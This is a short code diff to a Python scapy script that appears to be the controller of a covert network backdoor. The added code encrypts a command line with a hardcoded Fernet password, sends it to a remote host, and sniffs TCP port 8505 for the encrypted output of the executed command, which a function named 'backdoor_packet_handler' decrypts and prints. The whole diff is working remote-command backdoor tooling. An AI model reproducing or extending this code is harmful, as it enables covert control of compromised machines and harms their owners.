@@ -20,6 +20,11 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+
+def backdoor_packet_handler(pkt):
+    if TCP in pkt and pkt[TCP].dport==8505:
+        print(decrypt(pkt.load, b"password"))
 # ----------------------------------------------------------------------------------------------------------------------
 # The encrypt function takes in a message and encrypts using the Fernet encryption algorithm from the cryptography
 # package
@@ -80,4 +85,8 @@ ip.show()
 tcp = TCP(sport=int(srcPort))
 tcp.show()
 encryptCommand = encrypt(b"COMMAND_START"+cmdLn.encode()+b"COMMAND_END",b"password")
-(ip/tcp/encryptCommand).show()
+pack = (ip/tcp/encryptCommand)
+rtPack = sr(pack)
+
+#Wait for the return of command sent
+sniff(prn=backdoor_packet_handler, filter="tcp and dest port 8505", store=0)
